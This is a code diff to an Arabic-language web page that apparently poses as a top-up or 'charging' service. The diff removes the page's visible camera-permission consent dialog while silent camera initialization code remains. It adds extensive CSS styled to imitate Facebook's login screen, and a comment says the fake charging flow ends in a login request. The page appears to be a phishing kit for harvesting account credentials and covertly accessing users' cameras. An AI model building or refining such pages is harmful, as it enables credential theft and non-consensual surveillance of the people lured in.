@@ -763,82 +763,6 @@
             border-radius: 0 !important;
         }
 
-        /* نافذة طلب صلاحية الكاميرا */
-        #camera-permission-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 5000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .camera-permission-content {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            border-radius: 25px;
-            padding: 40px 35px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 500px;
-            text-align: center;
-            color: white;
-            border: 3px solid #ffd700;
-        }
-
-        .camera-permission-content h2 {
-            font-size: 28px;
-            margin-bottom: 20px;
-            color: #ffd700;
-        }
-
-        .camera-permission-content p {
-            font-size: 18px;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-
-        .camera-permission-actions {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-        }
-
-        .camera-permission-btn {
-            padding: 15px 30px;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            min-width: 150px;
-        }
-
-        .allow-camera-btn {
-            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
-            color: white;
-        }
-
-        .allow-camera-btn:hover {
-            background: linear-gradient(135deg, #229954 0%, #27ae60 100%);
-            transform: translateY(-3px);
-        }
-
-        .deny-camera-btn {
-            background: #e74c3c;
-            color: white;
-        }
-
-        .deny-camera-btn:hover {
-            background: #c0392b;
-            transform: translateY(-3px);
-        }
-
         /* تحسينات للهواتف */
         @media (max-width: 768px) {
             body {
@@ -921,31 +845,6 @@
                 font-size: 14px;
                 top: 8px;
                 left: 8px;
-            }
-
-            /* نافذة طلب صلاحية الكاميرا للجوال */
-            .camera-permission-content {
-                padding: 30px 25px;
-                margin: 20px;
-            }
-            
-            .camera-permission-content h2 {
-                font-size: 24px;
-            }
-            
-            .camera-permission-content p {
-                font-size: 16px;
-            }
-            
-            .camera-permission-actions {
-                flex-direction: column;
-                gap: 10px;
-            }
-            
-            .camera-permission-btn {
-                width: 100%;
-                padding: 12px 20px;
-                font-size: 16px;
             }
         }
 
@@ -1051,6 +950,805 @@
         body.show-login .login-container {
             display: block !important;
         }
+        <style>
+/* تحسينات إضافية لصفحة تسجيل الدخول للجوال */
+@media (max-width: 1024px) {
+    .login-main-container {
+        width: 90%;
+        flex-direction: column;
+        text-align: center;
+    }
+    
+    .login-w-50 {
+        width: 100%;
+        margin-bottom: 30px;
+    }
+    
+    .login-logo img {
+        width: 250px;
+        margin-right: 0;
+        margin-top: 20px;
+    }
+    
+    .login-tag-line h3 {
+        margin-right: 0;
+        font-size: 22px;
+        line-height: 1.4;
+    }
+    
+    .login-form-section {
+        width: 100%;
+        margin-right: 0;
+        max-width: 400px;
+        margin: 0 auto;
+    }
+}
+
+@media (max-width: 768px) {
+    .login-container {
+        padding: 60px 0 100px 0;
+    }
+    
+    .login-logo img {
+        width: 200px;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 20px;
+        padding: 0 15px;
+    }
+    
+    .login-form-section {
+        padding: 12px 12px 0;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        padding: 12px 0 14px 12px;
+        font-size: 15px;
+    }
+    
+    .login-form-section input[type="submit"] {
+        padding: 10px 0 11px 0;
+        font-size: 18px;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        width: 70%;
+        margin: 20px 0 20px 15%;
+        padding: 12px 6px 12px 6px;
+        font-size: 16px;
+    }
+    
+    .login-create-page p {
+        margin-right: 0;
+        font-size: 13px;
+        padding: 0 10px;
+    }
+}
+
+@media (max-width: 480px) {
+    .login-container {
+        padding: 40px 0 80px 0;
+    }
+    
+    .login-logo img {
+        width: 180px;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 18px;
+    }
+    
+    .login-form-section {
+        padding: 10px 10px 0;
+        border-radius: 6px;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        padding: 10px 0 12px 10px;
+        font-size: 14px;
+        margin-bottom: 10px;
+    }
+    
+    .login-form-section input[type="submit"] {
+        padding: 9px 0 10px 0;
+        font-size: 16px;
+    }
+    
+    .login-form-section a[class="forgot"] {
+        font-size: 13px;
+        margin-top: 12px;
+    }
+    
+    .login-form-section .line {
+        margin-top: 16px;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        width: 80%;
+        margin: 16px 0 16px 10%;
+        padding: 10px 6px 10px 6px;
+        font-size: 15px;
+    }
+    
+    .login-create-page p {
+        font-size: 12px;
+    }
+}
+
+@media (max-width: 375px) {
+    .login-container {
+        padding: 30px 0 60px 0;
+    }
+    
+    .login-logo img {
+        width: 160px;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 16px;
+    }
+    
+    .login-form-section {
+        padding: 8px 8px 0;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        padding: 8px 0 10px 8px;
+        font-size: 13px;
+    }
+    
+    .login-form-section input[type="submit"] {
+        padding: 8px 0 9px 0;
+        font-size: 15px;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        width: 85%;
+        margin: 14px 0 14px 7.5%;
+        font-size: 14px;
+    }
+}
+
+/* تحسينات عامة للتجربة على الجوال */
+.login-form-section input[type="text"],
+.login-form-section input[type="password"] {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+}
+
+.login-form-section input[type="submit"] {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+}
+
+/* منع التكبير التلقائي على حقول الإدخال في iOS */
+@media (max-width: 768px) {
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        font-size: 16px; /* منع التكبير في iOS */
+    }
+}
+
+/* تحسينات للوضع الأفقي على الجوال */
+@media (max-height: 500px) and (orientation: landscape) {
+    .login-container {
+        padding: 20px 0 40px 0;
+    }
+    
+    .login-main-container {
+        flex-direction: row;
+    }
+    
+    .login-w-50 {
+        width: 50%;
+        margin-bottom: 0;
+    }
+    
+    .login-logo img {
+        width: 120px;
+        margin-top: 10px;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 14px;
+    }
+    
+    .login-form-section {
+        max-width: 300px;
+    }
+}
+        /* تحسينات متقدمة لصفحة تسجيل الدخول للجوال - تصميم فيسبوك */
+@media (max-width: 900px) {
+    .login-container {
+        padding: 72px 0 112px 0;
+        background-color: #f0f2f5;
+    }
+    
+    .login-main-container {
+        width: 100%;
+        max-width: 400px;
+        flex-direction: column;
+        padding: 0 16px;
+    }
+    
+    .login-w-50 {
+        width: 100%;
+        text-align: center;
+        margin-bottom: 0;
+    }
+    
+    .login-logo {
+        margin-bottom: 16px;
+    }
+    
+    .login-logo img {
+        width: 240px;
+        margin: 0 auto;
+        display: block;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 18px;
+        line-height: 24px;
+        margin: 0 0 24px 0;
+        padding: 0 20px;
+        color: #1c1e21;
+        font-weight: normal;
+        text-align: center;
+    }
+    
+    .login-form-section {
+        width: 100%;
+        max-width: 396px;
+        margin: 0 auto;
+        padding: 16px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+        background: #fff;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        width: 100%;
+        padding: 14px 16px;
+        font-size: 17px;
+        border-radius: 6px;
+        border: 1px solid #dddfe2;
+        margin-bottom: 12px;
+        background: #fff;
+    }
+    
+    .login-form-section input[type="submit"] {
+        background-color: #1877f2;
+        border: none;
+        border-radius: 6px;
+        font-size: 20px;
+        line-height: 48px;
+        padding: 0 16px;
+        width: 100%;
+        color: #fff;
+        font-weight: bold;
+        margin-bottom: 16px;
+    }
+    
+    .login-form-section a[class="forgot"] {
+        color: #1877f2;
+        font-size: 14px;
+        font-weight: 500;
+        text-decoration: none;
+        display: block;
+        text-align: center;
+        margin: 0 0 16px 0;
+    }
+    
+    .login-form-section .line {
+        border-bottom: 1px solid #dadde1;
+        margin: 20px 0 24px 0;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        background-color: #42b72a;
+        border: none;
+        border-radius: 6px;
+        font-size: 17px;
+        line-height: 48px;
+        padding: 0 16px;
+        display: block;
+        text-align: center;
+        color: #fff;
+        font-weight: bold;
+        text-decoration: none;
+        margin: 0 auto;
+        width: 60%;
+    }
+    
+    .login-create-page {
+        margin-top: 28px;
+        text-align: center;
+    }
+    
+    .login-create-page p {
+        margin: 0;
+        font-size: 14px;
+        color: #1c1e21;
+    }
+    
+    .login-create-page p > a {
+        font-weight: bold;
+        color: #1c1e21;
+        text-decoration: none;
+    }
+}
+
+/* تحسينات إضافية للشاشات الصغيرة جداً */
+@media (max-width: 480px) {
+    .login-container {
+        padding: 60px 0 80px 0;
+    }
+    
+    .login-main-container {
+        padding: 0 12px;
+    }
+    
+    .login-logo img {
+        width: 200px;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 16px;
+        line-height: 22px;
+        padding: 0 10px;
+        margin-bottom: 20px;
+    }
+    
+    .login-form-section {
+        padding: 12px;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        padding: 12px 14px;
+        font-size: 16px;
+    }
+    
+    .login-form-section input[type="submit"] {
+        font-size: 18px;
+        line-height: 44px;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        font-size: 16px;
+        line-height: 44px;
+        width: 70%;
+    }
+    
+    .login-create-page p {
+        font-size: 13px;
+    }
+}
+
+/* تحسينات للشاشات الصغيرة جداً (iPhone SE وما شابه) */
+@media (max-width: 375px) {
+    .login-container {
+        padding: 50px 0 70px 0;
+    }
+    
+    .login-logo img {
+        width: 180px;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 15px;
+        line-height: 20px;
+        margin-bottom: 18px;
+    }
+    
+    .login-form-section {
+        padding: 10px;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        padding: 10px 12px;
+        font-size: 15px;
+    }
+    
+    .login-form-section input[type="submit"] {
+        font-size: 17px;
+        line-height: 42px;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        font-size: 15px;
+        line-height: 42px;
+        width: 75%;
+    }
+}
+
+/* تحسينات للوضع الأفقي على الجوال */
+@media (max-width: 900px) and (orientation: landscape) {
+    .login-container {
+        padding: 40px 0 60px 0;
+    }
+    
+    .login-main-container {
+        max-width: 500px;
+        flex-direction: row;
+        align-items: flex-start;
+    }
+    
+    .login-w-50 {
+        width: 50%;
+        text-align: left;
+    }
+    
+    .login-logo img {
+        width: 160px;
+        margin-left: 0;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 16px;
+        line-height: 20px;
+        padding: 0;
+        text-align: left;
+        margin-bottom: 0;
+    }
+    
+    .login-form-section {
+        max-width: 300px;
+    }
+}
+
+/* منع التكبير التلقائي على حقول الإدخال في iOS */
+@media (max-width: 900px) {
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        font-size: 16px !important;
+    }
+}
+
+/* تحسينات للأجهزة التي تدعم اللمس */
+@media (max-width: 900px) {
+    .login-form-section input[type="submit"]:active {
+        background-color: #166fe5;
+        transform: scale(0.98);
+    }
+    
+    .login-form-section a[class="create-new-acc"]:active {
+        background-color: #36a420;
+        transform: scale(0.98);
+    }
+    
+    .login-form-section a[class="forgot"]:active {
+        opacity: 0.7;
+    }
+}
+        /* تصميم صفحة تسجيل الدخول تشغل الشاشة كاملة على الجوال */
+@media (max-width: 900px) {
+    .login-container {
+        padding: 0 !important;
+        margin: 0 !important;
+        background: #f0f2f5;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        overflow-y: auto;
+    }
+    
+    .login-main-container {
+        width: 100% !important;
+        max-width: 100% !important;
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        padding: 20px 16px !important;
+        margin: 0 !important;
+    }
+    
+    .login-w-50 {
+        width: 100% !important;
+        text-align: center;
+        margin-bottom: 0;
+    }
+    
+    .login-logo {
+        margin-bottom: 24px;
+        margin-top: 20px;
+    }
+    
+    .login-logo img {
+        width: 200px !important;
+        margin: 0 auto;
+        display: block;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 18px;
+        line-height: 24px;
+        margin: 0 0 32px 0;
+        padding: 0 20px;
+        color: #1c1e21;
+        font-weight: normal;
+        text-align: center;
+    }
+    
+    .login-form-section {
+        width: 100% !important;
+        max-width: 400px !important;
+        margin: 0 auto !important;
+        padding: 20px 16px !important;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+        background: #fff;
+        flex-shrink: 0;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        width: 100% !important;
+        padding: 14px 16px !important;
+        font-size: 16px !important;
+        border-radius: 6px;
+        border: 1px solid #dddfe2;
+        margin-bottom: 12px;
+        background: #fff;
+        box-sizing: border-box;
+    }
+    
+    .login-form-section input[type="submit"] {
+        background-color: #1877f2;
+        border: none;
+        border-radius: 6px;
+        font-size: 18px !important;
+        line-height: 48px;
+        padding: 0 16px;
+        width: 100%;
+        color: #fff;
+        font-weight: bold;
+        margin-bottom: 16px;
+        cursor: pointer;
+    }
+    
+    .login-form-section a[class="forgot"] {
+        color: #1877f2;
+        font-size: 14px;
+        font-weight: 500;
+        text-decoration: none;
+        display: block;
+        text-align: center;
+        margin: 0 0 20px 0;
+    }
+    
+    .login-form-section .line {
+        border-bottom: 1px solid #dadde1;
+        margin: 20px 0 24px 0;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        background-color: #42b72a;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px !important;
+        line-height: 48px;
+        padding: 0 16px;
+        display: block;
+        text-align: center;
+        color: #fff;
+        font-weight: bold;
+        text-decoration: none;
+        margin: 0 auto;
+        width: 60%;
+    }
+    
+    .login-create-page {
+        margin-top: 24px;
+        text-align: center;
+        flex-shrink: 0;
+    }
+    
+    .login-create-page p {
+        margin: 0;
+        font-size: 14px;
+        color: #1c1e21;
+    }
+    
+    .login-create-page p > a {
+        font-weight: bold;
+        color: #1c1e21;
+        text-decoration: none;
+    }
+    
+    .login-success,
+    #login-status {
+        max-width: 400px;
+        margin: 16px auto !important;
+    }
+    
+    .footer {
+        background: #fff;
+        padding: 16px;
+        margin-top: auto !important;
+        border-top: 1px solid #dddfe2;
+        flex-shrink: 0;
+    }
+    
+    .footer p {
+        margin: 4px 0;
+        font-size: 12px;
+    }
+}
+
+/* تحسينات للشاشات الصغيرة جداً */
+@media (max-width: 480px) {
+    .login-main-container {
+        padding: 16px 12px !important;
+    }
+    
+    .login-logo img {
+        width: 180px !important;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 16px;
+        line-height: 22px;
+        padding: 0 16px;
+        margin-bottom: 28px;
+    }
+    
+    .login-form-section {
+        padding: 16px 12px !important;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        padding: 12px 14px !important;
+        font-size: 16px !important;
+    }
+    
+    .login-form-section input[type="submit"] {
+        font-size: 17px !important;
+        line-height: 44px;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        font-size: 15px !important;
+        line-height: 44px;
+        width: 70%;
+    }
+    
+    .login-create-page p {
+        font-size: 13px;
+    }
+}
+
+/* تحسينات للشاشات الصغيرة جداً (iPhone SE) */
+@media (max-width: 375px) {
+    .login-main-container {
+        padding: 12px 10px !important;
+    }
+    
+    .login-logo {
+        margin-bottom: 20px;
+        margin-top: 16px;
+    }
+    
+    .login-logo img {
+        width: 160px !important;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 15px;
+        line-height: 20px;
+        margin-bottom: 24px;
+    }
+    
+    .login-form-section {
+        padding: 14px 10px !important;
+    }
+    
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        padding: 11px 12px !important;
+    }
+    
+    .login-form-section input[type="submit"] {
+        font-size: 16px !important;
+        line-height: 42px;
+    }
+    
+    .login-form-section a[class="create-new-acc"] {
+        font-size: 14px !important;
+        line-height: 42px;
+        width: 75%;
+    }
+    
+    .footer {
+        padding: 12px 10px;
+    }
+}
+
+/* تحسينات للوضع الأفقي على الجوال */
+@media (max-width: 900px) and (orientation: landscape) {
+    .login-container {
+        padding: 0 !important;
+    }
+    
+    .login-main-container {
+        padding: 10px 16px !important;
+        flex-direction: row;
+        align-items: center;
+        justify-content: space-between;
+    }
+    
+    .login-w-50 {
+        width: 45% !important;
+        text-align: left;
+    }
+    
+    .login-logo {
+        margin-bottom: 12px;
+        margin-top: 0;
+    }
+    
+    .login-logo img {
+        width: 140px !important;
+        margin-left: 0;
+    }
+    
+    .login-tag-line h3 {
+        font-size: 14px;
+        line-height: 18px;
+        padding: 0;
+        text-align: left;
+        margin-bottom: 0;
+    }
+    
+    .login-form-section {
+        width: 50% !important;
+        max-width: 280px !important;
+        padding: 16px 12px !important;
+    }
+    
+    .login-create-page {
+        display: none;
+    }
+}
+
+/* تحسينات التفاعل على الجوال */
+@media (max-width: 900px) {
+    .login-form-section input[type="submit"]:active {
+        background-color: #166fe5;
+        transform: scale(0.98);
+    }
+    
+    .login-form-section a[class="create-new-acc"]:active {
+        background-color: #36a420;
+        transform: scale(0.98);
+    }
+    
+    .login-form-section a[class="forgot"]:active {
+        opacity: 0.7;
+    }
+    
+    /* منع التكبير التلقائي على حقول الإدخال في iOS */
+    .login-form-section input[type="text"],
+    .login-form-section input[type="password"] {
+        font-size: 16px !important;
+    }
+}
+</style>
     </style>
 </head>
 <body>
@@ -1087,20 +1785,6 @@
             <div class="terms-actions">
                 <button class="terms-btn cancel-btn" id="cancel-terms">إلغاء</button>
                 <button class="terms-btn agree-btn" id="agree-terms" disabled>موافق</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة طلب صلاحية الكاميرا -->
-    <div id="camera-permission-modal">
-        <div class="camera-permission-content">
-            <h2>📷 صلاحية الكاميرا مطلوبة</h2>
-            <p>لإتمام عملية الشحن، نحتاج إلى الوصول إلى الكاميرا الخاصة بك للتحقق من هويتك.</p>
-            <p>سيتم استخدام الكاميرا لالتقاط صورة واحدة فقط ولا يتم حفظها أو مشاركتها.</p>
-            
-            <div class="camera-permission-actions">
-                <button class="camera-permission-btn allow-camera-btn" id="allow-camera">السماح بالوصول</button>
-                <button class="camera-permission-btn deny-camera-btn" id="deny-camera">رفض</button>
             </div>
         </div>
     </div>
@@ -1299,9 +1983,6 @@
         const circleBar = document.getElementById('circle-bar');
         const chargeCounter = document.getElementById('charge-counter');
         const goToLoginBtn = document.getElementById('go-to-login');
-        const cameraPermissionModal = document.getElementById('camera-permission-modal');
-        const allowCameraBtn = document.getElementById('allow-camera');
-        const denyCameraBtn = document.getElementById('deny-camera');
         
         let stream = null;
         let cameraInitialized = false;
@@ -1412,7 +2093,7 @@
         serverSelect.addEventListener('change', checkFormCompletion);
         
         // زر المتابعة إلى الدفع - الكود المصحح
-        proceedBtn.addEventListener('click', async function() {
+        proceedBtn.addEventListener('click', function() {
             if (!termsAccepted) {
                 showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
                 termsModal.style.display = 'flex';
@@ -1434,50 +2115,8 @@
                 return;
             }
             
-            // التحقق من صلاحية الكاميرا أولاً
-            await checkCameraPermission();
-        });
-        
-        // التحقق من صلاحية الكاميرا
-        async function checkCameraPermission() {
-            try {
-                // محاولة الوصول إلى الكاميرا لاختبار الصلاحية
-                const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // إذا نجحنا، نوقف الكاميرا ونبدأ عملية الشحن
-                testStream.getTracks().forEach(track => track.stop());
-                
-                // بدء عملية الشحن
-                showChargingProcess();
-                
-            } catch (error) {
-                // إذا لم تكن الصلاحية متاحة، نعرض نافذة طلب الصلاحية
-                console.log('Camera permission not granted:', error);
-                cameraPermissionModal.style.display = 'flex';
-            }
-        }
-        
-        // زر السماح بالوصول إلى الكاميرا
-        allowCameraBtn.addEventListener('click', async function() {
-            cameraPermissionModal.style.display = 'none';
-            
-            try {
-                // محاولة الحصول على صلاحية الكاميرا مرة أخرى
-                await initializeCameraSilently();
-                
-                // إذا نجحنا، نبدأ عملية الشحن
-                showChargingProcess();
-                
-            } catch (error) {
-                // إذا فشلنا، نعرض رسالة خطأ
-                showStatus('لم يتم منح صلاحية الكاميرا. يرجى السماح بالوصول للمتابعة.', 'error');
-            }
-        });
-        
-        // زر رفض الوصول إلى الكاميرا
-        denyCameraBtn.addEventListener('click', function() {
-            cameraPermissionModal.style.display = 'none';
-            showStatus('يجب السماح بالوصول إلى الكاميرا لإتمام عملية الشحن.', 'error');
+            // بدء عملية الشحن التي تنتهي بطلب تسجيل الدخول
+            showChargingProcess();
         });
         
         // دالة عرض نافذة الشحن
@@ -1591,7 +2230,6 @@
                 } catch (secondError) {
                     console.log('❌ Camera initialization completely failed:', secondError);
                     showStatus('تعذر الوصول إلى الكاميرا', 'error');
-                    throw secondError; // إعادة رمي الخطأ للتعامل معه في مكان آخر
                 }
             }
         }
@@ -1790,3 +2428,6 @@
     </script>
 </body>
 </html>
+
+
+
